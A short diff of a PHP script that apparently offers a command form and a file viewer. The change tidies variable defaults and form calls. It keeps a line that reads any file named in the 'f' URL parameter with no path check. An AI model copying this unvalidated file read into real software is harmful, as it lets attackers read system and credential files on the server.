@@ -29,11 +29,13 @@ if($_REQUEST['do']){
     }
 
 }else{
-    $file = $_GET['f'];
+    $cmd = '';
+    $file = $_GET['f'] ?? '';
+    $content = '';
     if($file){
         $content = file_get_contents($file);
     }
-    echo cmdform().contentform();
+    echo cmdform($cmd).contentform($file, $content);
 }
 
 function cmdform($cmd){
